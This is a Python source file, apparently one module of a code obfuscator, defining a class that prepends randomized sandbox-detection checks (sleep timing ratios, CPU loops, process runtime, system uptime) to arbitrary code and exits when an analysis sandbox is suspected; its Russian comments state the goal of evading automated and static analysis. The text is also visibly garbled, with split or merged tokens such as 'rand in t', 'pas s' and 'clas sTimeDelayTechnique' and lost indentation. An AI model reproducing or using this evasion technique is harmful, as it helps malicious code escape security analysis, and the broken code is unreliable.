import random



import time



from typ in gimport List,Dict,Any,Tuple







clas sTimeDelayTechnique:











def__init__(self):







        self.min_delay=1



self.max_delay=10











self.min_checks=2



self.max_checks=5











self.complex_check_probability=0.7











self.check_methods=[



self._generate_simple_delay,



self._generate_sleep_check,



self._generate_cpu_intensive_check,



self._generate_check_execution_time,



self._generate_system_uptime_check



]







defapply(self,code:str)->str:











num_checks=random.rand in t(self.min_checks,self.max_checks)











delay_checks=[]



for_inrange(num_checks):







            check_method=random.choice(self.check_methods)



check_code=check_method()



delay_checks.append(check_code)











time_delay_code=f"""
# Проверки временных задержек для обхода автоматизированного анализа
def _perform_time_checks():
    import time
    import random
    import sys
    
    # Случайная начальная задержка для усложнения статического анализа
    time.sleep(random.unif orm(0.1, 0.5))
    
{"".join(delay_checks)}
    
    return False  # Песочница не обнаружена

# Выполняем проверки временных задержек
if _perform_time_checks():
    # Песочница обнаружена, выходим или выполняем обманные действия
    import sys
    sys.exit(0)

"""







code=time_delay_code+code



return code







def_generate_simple_delay(self)->str:







delay_time=random.unif orm(self.min_delay,self.max_delay)



var_name=f"_delay_{random.rand in t(10000, 99999)}"







return f"""
    # Простая временная задержка
    {var_name} = time.time()
    time.sleep({delay_time:.2f})
    elapsed = time.time() - {var_name}
    
    # Проверяем, была ли задержка меньше ожидаемой (признак ускорения в песочнице)
    if elapsed < {delay_time * 0.8:.2f}:
        return True  # Возможно, время было подделано
    
"""







def_generate_sleep_check(self)->str:







delay1=random.unif orm(0.5,2.0)



delay2=random.unif orm(2.0,4.0)



var_name1=f"_sleep_check1_{random.rand in t(10000, 99999)}"



var_name2=f"_sleep_check2_{random.rand in t(10000, 99999)}"







return f"""
    # Проверка соотношения sleep задержек
    {var_name1} = time.time()
    time.sleep({delay1:.2f})
    elapsed1 = time.time() - {var_name1}
    
    {var_name2} = time.time()
    time.sleep({delay2:.2f})
    elapsed2 = time.time() - {var_name2}
    
    # Проверяем соотношение между вызовами sleep
    # Если временные промежутки сильно искажены, это может быть признаком песочницы
    ratio = elapsed2 / elapsed1 if elapsed1 > 0 else 0
    expected_ratio = {delay2 / delay1:.2f}
    
    if abs(ratio - expected_ratio) > {(delay2 / delay1) * 0.3:.2f}:
        return True  # Подозрительное искажение временных задержек
    
"""







def_generate_cpu_intensive_check(self)->str:







iterations=random.rand in t(500000,2000000)



var_name=f"_cpu_check_{random.rand in t(10000, 99999)}"







return f"""
    # CPU-интенсивная операция для измерения производительности
    {var_name}_start = time.time()
    _temp_result = 0
    for i in range({iterations}):
        _temp_result = (_temp_result + i) % 10000007
    {var_name}_duration = time.time() - {var_name}_start
    
    # Оцениваем производительность
    # В песочницах часто ограниченные ресурсы или эмуляция, что влияет на скорость
    if {var_name}_duration < {iterations / 10000000:.2f}:  # Подозрительно быстро
        return True
    
    if {var_name}_duration > {iterations / 100000:.2f}:  # Подозрительно медленно
        return True
    
"""







def_generate_check_execution_time(self)->str:







var_name=f"_exec_start_{random.rand in t(10000, 99999)}"







return f"""
    # Проверка общего времени выполнения программы
    import os
    
    # Получаем время запуска процесса
    try:
        if sys.platform == 'win32':
            import psutil
            process = psutil.Process(os.getpid())
            {var_name} = process.create_time()
            process_runtime = time.time() - {var_name}
            
            # Слишком короткое время выполнения может указывать на подделку времени
            if process_runtime < 1.0:
                return True
                
        elif sys.platform.startswith('l in ux'):
            # На L in ux читаем /proc/stat
            with open(f'/proc/{{os.getpid()}}/stat', 'r') as f:
                stats = f.read().split()
                start_time_ticks = float(stats[21])
                
                # Получаем время загрузки системы
                with open('/proc/uptime', 'r') as f:
                    uptime = float(f.read().split()[0])
                    
                # Вычисляем время работы процесса
                if uptime - (start_time_ticks / os.sysconf(os.sysconf_names['SC_CLK_TCK'])) < 1.0:
                    return True
    except:
        pas s
    
"""







def_generate_system_uptime_check(self)->str:







uptime_threshold=random.rand in t(60,3600)



var_name=f"_uptime_check_{random.rand in t(10000, 99999)}"







return f"""
    # Проверка времени работы системы
    # Песочницы обычно перезапускаются перед каждым анализом,
    # поэтому время их работы обычно очень короткое
    try:
        {var_name} = 0
        
        if sys.platform == 'win32':
            import ctypes
            kernel32 = ctypes.w in dll.kernel32
            {var_name} = kernel32.GetTickCount64() / 1000  # Конвертация в секунды
        
        elif sys.platform.startswith('l in ux'):
            with open('/proc/uptime', 'r') as f:
                {var_name} = float(f.read().split()[0])
        
        elif sys.platform == 'darwin':
            import subprocess
            cmd = 'sysctl -n kern.boottime'
            boottime = int(subprocess.check_output(cmd, shell=True).decode().split()[3].strip(','))
            {var_name} = time.time() - boottime
        
        # Если система запущена меньше порогового значения, возможно это песочница
        if {var_name} < {uptime_threshold}:
            return True
    except:
        pas s
    
"""







def__call__(self,code:str)->str:







return self.apply(code)